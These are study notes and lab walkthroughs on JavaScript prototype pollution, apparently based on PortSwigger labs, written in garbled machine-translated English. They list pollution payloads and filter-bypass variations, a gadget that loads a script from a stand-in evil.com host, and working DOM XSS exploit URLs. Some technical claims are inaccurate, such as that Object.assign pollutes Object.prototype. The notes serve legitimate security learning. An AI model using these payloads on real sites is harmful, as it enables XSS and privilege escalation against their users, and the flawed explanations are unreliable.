<img width="804" height="277" alt="image" src="https://github.com/user-attachments/assets/3f32f2a6-3ef9-4d4c-9eb0-e1417be8eb63" /># prototype pollution


<details>
  <summary>What is prototype pollution</summary>


✅ First: What does Prototype mean?
=========================================

In JavaScript, any object that has a *parent* is named **prototype**.

Simple example:

```js
const person = {};
```

This `person` is empty... but if you do:

```js
console.log(person.toString);
```

In it you will find a function called `toString`\
Even though you **didn't write it**!

for him?\
Because `person` inherits ready-made functions from **object prototype**.

Think about it like this:

👨‍👦 i.e. Object = son...\
👴 Prototype = the parent from whom the son inherits ready-made properties.


---

✅ Ok, what does Prototype Pollution mean?
===================================

It is that **The hacker can modify the father (prototype)**\
Therefore **all children (all objects)** change automatically... and this is very dangerous.


---

🎯 A very simple real example

======================

Suppose there is a site that stores user settings in an object named `settings`.

The site allows the user to modify the settings himself through JSON.

It's supposed to be JSON like this:

```json
{

  "theme": "dark"

}
```

But the hacker can send:

```json
{

  "__proto__": {

    "isAdmin": true

  }

}
```

What will happen?

It will add the `isAdmin = true` property to **Object.prototype**

This means that every object on the site will have:

```json
obj.isAdmin === true
```

Thus, the site may think that the hacker is an addict... and from here it happens:

- Unauthorized Access

-   Bypass Auth

-   Code Execution sometimes

-   Change important functions


----

## 🎯 Practical example in code

```js
let user = {};

console.log(user.isAdmin); // undefined

// hacker payload
let payload = JSON.parse('{"__proto__": {"isAdmin": true}}');

Object.assign({}, payload);

console.log(user.isAdmin); // true !!!
```


Note:

- `user` object is already **empty**

- However, it became `isAdmin=true`

- Because the hacker poisoned the prototype

---


<details>
  <summary>Q</summary>


🎯 **First question: Do we always have to write `__proto__`?**
=================================================

**no.**\
You don't always have to use `__proto__`.

There are 3 main ways of pollution:

1️⃣ `__proto__`
---------------

This is the most popular method:

```json
{ "__proto__": { "isAdmin": true } }
```

This is to modify **Object.prototype**.

* * * * *

2️⃣ `constructor.prototype`
---------------------------

Stronger method:

```json
{ "constructor": { "prototype": { "isAdmin": true } } }
```

You modify the prototype via constructor.

* * * * *

3️⃣ `prototype`
---------------

This is used in functions/classes:

```json
{ "prototype": { "isAdmin": true } }
```

* * * * *

🎯 **The second question: How does the code work? (Execution Flow)**
====================================================

You feel that there is something mysterious because you do not see the “journey” that the code is making.

Let me explain it in an easier way:

* * * * *

⭐ **This journey happens when the code runs Merge / Assign / Deep Copy**
=================================================================

for example:

```js
Object.assign(target, userInput);
```

or

```js
_.merge(target, userInput);
```

or

```
jQuery.extend(true, target, userInput);
```

All of these do the same thing we will explain.

---

✨ Step 1: JavaScript takes the keys from the user input
-----------------------------------------------------

example:

```js
{
  "__proto__": { "x": 1 }
}
```

JavaScript shows:\
**It has a key named `__proto__`**

* * * * *

✨ Step 2: JavaScript tries to add this key to the target
-----------------------------------------------------

If we wrote:

```js
Object.assign({}, { "__proto__": { "x": 1 } });
```

It will not add a regular property called `__proto__`\
No... JavaScript will say:

> Oh... This is the key that modifies the prototype of the object itself.

And it remains as if it worked:

```js
Object.prototype.x = 1;
```

* * * * *

✨ Step 3: Every object in the program is affected

-------------------------------------

for him?

Because every Object is inherited from **Object.prototype**

Any new or old object will remain in it:

```js
anyObject.x === 1
```

Even if object is empty:

```js
let a = {};

console.log(a.x); // 1
```

* * * * *

🎯 Ok, why does JavaScript do this?

=============================================

Why is `__proto__` not a regular key?

Because historically, `__proto__` was a built-in way to manually change the prototype.

Like this:

```js
let obj = { a: 1 };

let newProto = { b: 2 };

obj.__proto__ = newProto;
```

This is an old concept in JavaScript...

But some merge libraries treat `__proto__` as if it were a regular key -- and here is the problem.

* * * * *


🎯 An example that literally shows flow
=========================================

See this example step by step:

```js
let settings = {};   // target

let payload = {
  "__proto__": {
    hacked: true
  }
};

// The merge process that occurs on real sites
Object. assign(settings, payload);

```

Steps:

1. JavaScript reads key=`__proto__`

2. It knows that it is **private** (not a regular key)

3. Changes Object.prototype

4. All objects are contaminated

try:

```js
let user = {};
console. log(user. hacked);   //true
```

Even if `user` has nothing to do with settings or payload.

* * * * *

🔥 A stronger example that explains everything
=========================

```js
let safe = {};
console.log(safe.isAdmin); //undefined

let attacker_payload = JSON. parse(`
{
  "__proto__": {
    "isAdmin": true
  }
}
`);

Object. assign({}, attacker_payload);

console.log(safe.isAdmin); // true (disaster)

```













⭐ **The ideal order used by hackers (and in CTFs)**
=======================================================

1️⃣ The first thing to do is try `__proto__`
--------------------------

Because it is the “weakest + most common” and wins close to 60% of cases.

Payload:

`{ "__proto__": { "isAdmin": true } }`

* * * * *

2️⃣ If that doesn't work → try `constructor.prototype`
-----------------------------------------

This is the strongest one, and often works when the parser prevents `__proto__`.

Payload:

`{
  "constructor": {
    "prototype": {
      "isAdmin": true
    }
  }
}`

This is very dangerous, especially in Node.js.

* * * * *





3️⃣ If not → try `prototype`
---------------------------------

This works if the internal code deals with Functions and not Objects.

Payload:

`{
  "prototype": {
    "isAdmin": true
  }
}`

It works specifically with classes.

* * * * *


4️⃣ Then try Variations
---------------------------

This is important in bug bounty because sometimes dev is a partial validation operator:

### Variation #1 --- Escape keys

`{ "\\__proto__": { "isAdmin": true } }`

### Variation #2 --- Arrays

`{
  "__proto__": [{
    "isAdmin": true
  }]
}`

### Variation #3 --- Nested pollution

`{
  "a": {
    "__proto__": { "isAdmin": true }
  }
}`

Sometimes the code does a deep merge, so it remains effective.

* * * * *

🎯 **When should I use which one?**
===============================

Look at this table:

| status | The method that will most likely work |
| --- | --- |
| Old site/jQuery library/lodash before 4.17 | `__proto__` |
| The code explicitly prevents `__proto__` | `constructor.prototype` |
| The code deals with classes, not objects | `prototype` |
| In Validation in the form of the key | Use escaped version |
| The code performs a deep merge of nested content | nested `__proto__` |

* * * * *

🔥 **How ​​do I know it worked?**
=============================

Do a simple test:

`{
  "__proto__": { "pwned": 1 }
}`

And after you do send\
Try on any other request:

`{}["pwned"]`

If it returns `1` → the site remains **polluted**

















  
</details>


---



  
</details>



<details>
  <summary>How do prototype pollution vulnerabilities arise?</summary>


🎯 **Prototype Pollution vulnerabilities arise when...?**
=======================================================

**When JavaScript merges an object, it receives data from the user.
Without making sure that the keys inside it are safe.**

* * * * *

💡 A very simple example
-----------------

The program has object:

```js
let settings = { theme: "light" };
```

It takes input from the user:

```js
{
  "__proto__": {
    "isAdmin": true
  }
}
```

And the developer works:

```js
Object.assign(settings, userInput);
```

It is supposed to add a regular property...\
But because the key is `__proto__` → JavaScript modifies **Object.prototype**.

Hence:

```js
console.log({}.isAdmin); // true ← prototype polluted
```

* * * * *


🔥 Main point
==================

JavaScript specifically understands `__proto__`...\
It is not as if it is just a key, but as if it were **instructions telling him: “Modify the prototype”**.

Why does merge happen without sanitization?
The attack works.

* * * * *

⭐ PortSwigger Explanation (Guaranteed in simple style)
===============================================

✔️ (1) **Prototype Pollution Source**
-------------------------------------

This is the place where the hacker can enter a key like:

- `__proto__`

- `constructor`

- `prototype`

If the API endpoint receives:

```js
{ "__proto__": { "x": 1 } }
```

Without validation → you have Source.

* * * * *

✔️ (2) **Sink**
---------------

The "sink" is the place where the value with which the prototype was tainted is used.
In a dangerous way.

Example of sinks:

- DOM XSS (`innerHTML`, `src`, `href`)

- `eval()`

- file path operations

- template engines

It means a place that allows code to be executed or important behavior to be changed.

* * * * *

✔️ (3) **Gadget**
-----------------

This is the key that was contaminated and is used inside the sink.

example:

If you contaminate the prototype with:

```js
Object.prototype.src = "javascript:alert(1)";
```

And then a JavaScript page in it:

```js
img.src = userInput.src;
```

Here `src` comes from prototype due to contamination → gets XSS.

* * * * *

🎯 The final summary in an easy way
=============================

### Prototype Pollution = Pollution of the prototype using a private key

An explosion occurs when the following is present:

### 1️⃣ **Source**

User input allows the addition of dangerous keys (`__proto__`).

### 2️⃣ **Gadget**

The tainted property itself (such as `src`, `isAdmin`, or `toString`).

### 3️⃣ **Sink**

A place in the code that uses the property dangerously leads to:

- Privilege escalation

-XSS

-RCE

-Bypass checks

- DoS

* * * * *

🎉 A complete example that brings all three together
==============================

### Source

```js
{ "__proto__": { "evil": "<img src=x onerror=alert(1)>" } }
```

### Gadget

`evil`

### Sink

`element.innerHTML = user.evil;`

#### Result:

XSS from Prototype Pollution.











  
</details>



<details>
  <summary>Prototype pollution sources</summary>

🔥 **1) Sink --- the sink (or the hole into which the danger comes)**
==========================================================

### What is a Sink?

It is a place in the code where **dangerous execution** occurs:

- DOM sink → `innerHTML`, `src`, `href`, `eval`, ...

- System sink → Execute commands

- App sink → Add scripts --- Download files --- Send requests --- etc

As long as the application **uses a feature** and you were able to add it in the prototype → then you have reached Sink.

* * * * *


🧩 **2) Gadget --- Exploitation Device **
=================================

**Device = the property that the application uses without it being present in the object itself.**

Meaning:

- If the object does not have `transport_url`

- And the developer writes:

`let url = config. transport_url || defaults. transport_url;`

Meaning:

- If **config.transport_url** exists → use it

- If **it does not exist** → use default

In the polluting:

`Object.prototype.transport_url = "http://evil.com"`

The config will look like this:

`config = {} // There is no transport_url`

But because it is inherited from Object.prototype, so:

`config.transport_url === "http://evil.com"`

This is a gadget, because you can:

- Add property

- The application uses it without knowing that it is coming from the attacker

* * * * *

📌 **The importance of the exploitation device (Gadget)**
=================================================

Not any property remains useful.\
Necessary:

1. The application uses it in an important place

2. It is used without sanitization

3. It is used in Sink (such as .src, .href, eval)

* * * * *


💣 **The example I mentioned is PortSwigger**
=================================================

✨ Pollution:
---------

The attacker works:

`https://site.com/?__proto__[transport_url]=//evil.com`

This leaves:

`Object.prototype.transport_url = "http://evil.com"`

* * * * *

✨ Weak code:
---------------

`let transport_url = config. transport_url || defaults. transport_url;`

Because config is empty, transport_url is inherited from prototype.

* * * * *

✨ Sink:
-----------

`let script = document. createElement('script');
script.src = `${transport_url}/example.js`;
document.body.appendChild(script);`

The developer remembers that transport_url is **not user-controlled**\
But the hacker took control of it from the prototype.

Result:

`<script src="//evil.com/example.js"></script>`

This is classic **DOM-based XSS**.

* * * * *

🎇 **More dangerous version (Direct Payload)**
=================================

`https://site.com/?__proto__[transport_url]=data:,alert(1);//`

So it remains:

`script.src = "data:,alert(1);//example.js"`

Although the addition of `/example.js` is related to the comment `//`.

Result:\
Direct implementation of alert().

* * * * *

🧠 **Very easy conclusion**
==========================

Prototype Pollution alone:

✔️ Contaminates prototype\
❌ Not exploit

Prototype Pollution + Gadget + Sink:

💥Full exploit (XSS --- RCE --- hijack --- script injection)












  
</details>



<details>
  <summary>Client-side prototype pollution</summary>



🎯 **First: What does Client-side Prototype Pollution mean?**
=======================================================

This means that as an attacker you can:

1. Edit the **Object.prototype** from **Front End itself** (browser)

2. And let all the objects on the page inherit the properties you injected

3. After that, you find **gadget + sink** = and convert it to **DOM XSS**

The whole thing is 3 steps:

### 1) You find **source** (something that accepts `__proto__` from you)

### 2) Prototype contamination

### 3) Find a gadget with which the attack can be carried out (such as innerHTML or src)

* * * * *

🔥 **Second: How do we find the Prototype Pollution Source manually?**
============================================================

Idea:\
Try modifying the prototype by:

- **Query**

- **Fragment (#)**

- **JSON input**

- **web message (postMessage)**

### 👇 A very simple experience

You will see this page:

`https://victim.com/?__proto__[foo]=bar`

Open **Console** and type:

`Object.prototype.foo`

If the result:

`"bar"`

**pollution** prototype → you have **source**.

if:

`undefined`

Still **it doesn't work**... Try different formulas:

✔️ Bracket notification

`?__proto__[foo]=bar`

✔️ Do notation

`?__proto__.foo=bar`

✔️ Nested objects

`?__proto__[x][y]=123`

✔️ From fragment

`#?__proto__[foo]=bar`

✔️ in JSON\
You send JSON with `{"__proto__":{...}}`

* * * * *

🎯 **Summary of this stage**
=======================

> You are looking for any method that will allow you to add property to prototype.

After each attempt, you must return to the console and see:

`Object.prototype.foo`

* * * * *

🔥 **Third: How do we find Gadget manually?**
=====================================================

Now you know that there is **source**\
Now you want to see the application using any property you can play in.

👇 Simple steps:
------------------

### 1) Look at the properties the application uses

like:

-config.url

- config. transport_url

-template

-message

-render

-html

-src

-loadScript

-xhr.url

-options.something

Anything of this type can be a **gadget**.

* * * * *


### 2) Lock Response Interception in Burp

To modify the JS before it executes.

### 3) Add at the beginning of the script:

`debugger;`

To stop implementation.

* * * * *

### 4) In console you write:

`Object.defineProperty(Object.prototype, 'XXXX', {
    get() {
        console.trace();
        return "polluted";
    }
});`

Replace XXXX with potential for gadget\
like:

- transport_url

-template

-url

- handler

-callback

-render

* * * * *


### 5) Allow the browser page to continue (continue)

If **stack trace** appears on the console → Bravo!\
This means:

>The application reads the feature you injected\
>So it's a potential **gadget**.

* * * * *

### 6) Open the stack trace

The browser will take you to the line that the feature is reading.

See next:

-Does the property exceed innerHTML?

- Are you going to SRC?

- Do you follow eval?

- Do you use constructing script tag?

If ah → de **sink** successful → exploit ready.

* * * * *

🤖 **Why is DOM Invader easier?**
===============================

Because DOM Invader:

✔️ Tests all automatic pollution methods\
✔️ Auto detects gadgets\
✔️ It teaches you which line property\ is used in
✔️ PoC XSS ready\
✔️ It is activated from Burp Browser only

This means that instead of wasting an hour, you can finish the topic in **two seconds**.

* * * * *

🧠 **The summary that will get you started on laptops immediately:**
=============================================

### ✔️ Step 1 --- Did you find the source?

`Object.prototype.foo === "bar"`\
If it works → continue

### ✔️ Step 2 --- Turn on Gadget

Which property the application uses and you can do:

`__proto__[PROPERTY]=VALUE`

### ✔️ Step 3 --- Did you find a Sink?

innerHTML\
eval\
src\
href\
setTimeout\
script insertion

### 💥 Step 4 --- XSS is ready


















  
</details>





















































----

# **`labs`**

<details>
  <summary>Lab: DOM XSS via client-side prototype pollution</summary>



# 1. **`Find a prototype pollution source`**

```js
vulnerable-website.com/?__proto__[car]=tesla
# or
vulnerable-website.com/?__proto__.car=tesla
```

> ## and in console write:

```js
Object.prototype
```

<img width="890" height="357" alt="image" src="https://github.com/user-attachments/assets/a16f8dff-24db-49ca-ae4f-ea8e74247a28" />

> we found source


# 2. **`Identify a gadget`**

> ### in sourse tab found js files of website

<img width="924" height="611" alt="image" src="https://github.com/user-attachments/assets/69f54bc9-57b2-44fb-8ddd-c3da8d9da268" />

> ## in **`searchLogger.js`** found:

```js
 if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
```


<img width="804" height="277" alt="image" src="https://github.com/user-attachments/assets/8b59b25d-434c-4ef3-922c-cf652ccaefc0" />


```js
web-security-academy.net/?__proto__[transport_url]=tesla
```

> ## in elemets tab we will found new element added

<img width="1239" height="696" alt="image" src="https://github.com/user-attachments/assets/bcba0ebd-0835-4421-b7cc-9df06138db9f" />

> ## change it's content

```
/?__proto__[transport_url]=data:,alert(1);
```

<img width="1570" height="594" alt="image" src="https://github.com/user-attachments/assets/7f5c75c5-dfb3-4d40-981b-cbf2fbd5c4bb" />

---
---


📌 The basic idea before anything else
------------------------------

When JavaScript searches for a property **and cannot find it within the object itself**, it searches for it in the **prototype chain**.

Like this:

`obj → Object.prototype → null`

* * * * *

🎯 Now we return to our words:
=======================

❓ What does “config.transport_url not recognized in the object itself” mean?
---------------------------------------------------------------

Meaning:

`config = {
  mode: "prod",
  Retries: 3
}`

If you ask:

`config.transport_url`

You won't find it inside.

What will JavaScript do here?\
He will look for it in:

`Object.prototype.transport_url`

If he finds it there → he will take it and use it.

* * * * *

⚙️ Gadget = The feature **the code uses** And if it finds it in the prototype... disaster strikes.
--------------------------------------------------------------------------

example:

`sendData(config.transport_url);`

The code uses `transport_url`\
But **I don't know** in config\
So he goes to the prototype.

What do you work for:

`JSON.parse(`{
  "__proto__": { "transport_url": "tesla" }
}`);`

You stay dirty:

`Object.prototype.transport_url = "tesla"`

When the code works:

`sendData(config.transport_url)`

It will go to the one in Object.prototype\
Therefore, it remains Vulnerable Gadget 💣


# **`why we write /?__proto__[transport_url]=data:,alert(1); not /?__proto__[transport_url]=alert(1);`**

#2 - The JavaScript inside the URL needs a "URL Scheme" to work
========================================================

If you wrote:

`alert(1)`

This is **not a URL**\
If the browser sees something that is not a URL → it will likely ignore it or throw an Error**\
It will not execute any JavaScript.

We must type the URL "schema" for the browser to accept the value.

* * * * *

#3 -- The "data:" scheme runs JavaScript
=======================================

There are many schemes in the URL:

- `http://`

- `https://`

- `ftp://`

- `mailto:`

- **data:** ← What we want

* * * * *

example:
=====

`data:,alert(1);`

The browser interprets this as:

- scheme = `data:`

- data = `alert(1);`

Therefore, JavaScript is executed ✨.

* * * * *

#4 - Why don't we use `javascript:`?
===================================

Because many modern frameworks **block** this schema.
Such as React, Angular, and Next.js --- they remove it automatically.

But `data:` is allowed by most systems.
It is an excellent bypass.








  
</details>








<details>
  <summary>Lab: DOM XSS via an alternative prototype pollution vector</summary>




# 1. **`Find a prototype pollution source`**

```js
vulnerable-website.com/?__proto__[car]=tesla
# or
vulnerable-website.com/?__proto__.car=tesla  # Done
```

> ## and in console write:

```js
Object.prototype
```

<img width="890" height="357" alt="image" src="https://github.com/user-attachments/assets/a16f8dff-24db-49ca-ae4f-ea8e74247a28" />

> we found source


# 2. **`Identify a gadget`**

> ### in sourse tab found js files of website


<img width="1134" height="332" alt="image" src="https://github.com/user-attachments/assets/78228af4-47d6-4bb8-be4d-8b84f1548a83" />

```js
async function searchLogger() {
    window.macros = {};
    window.manager = {params: $.parseParams(new URL(location)), macro(property) {
            if (window.macros.hasOwnProperty(property))
                return macros[property]
        }};
    let a = manager.sequence || 1;
    manager.sequence = a + 1;

    eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');

    if(manager.params && manager.params.search) {
        await logQuery('/logger', manager.params);
    }
}
```

> ### found **`eval`** function and we found that manager.sequence is passed to `eval` but this is not defiend by default

```
vulnerable-website.com/?__proto__.sequence=alert(0)
```

> ## but nothing happend let's see console

<img width="541" height="85" alt="image" src="https://github.com/user-attachments/assets/763a60fe-bf40-49ad-a532-96b91d5d1374" />

1.  Observe that the payload doesn't execute.

2.  In the browser DevTools panel, go to the **Console** tab. Observe that you have triggered an error.

3.  Click the link at the top of the stack trace to jump to the line where `eval()` is called.

4.  Click the line number to add a breakpoint to this line, then refresh the page.

5.  Hover the mouse over the `manager.sequence` reference and observe that its value is `alert(1)1`. This indicates that we have successfully passed our payload into the sink, but a numeric `1` character is being appended to it, resulting in invalid JavaScript syntax.

6.  Click the line number again to remove the breakpoint, then click the play icon at the top of the browser window to resume code execution.

7.  Add trailing minus character to the payload to fix up the final JavaScript syntax:

    `/?__proto__.sequence=alert(1)-`
8.  Observe that the `alert(1)` is called and the lab is solved.




  
</details>



























































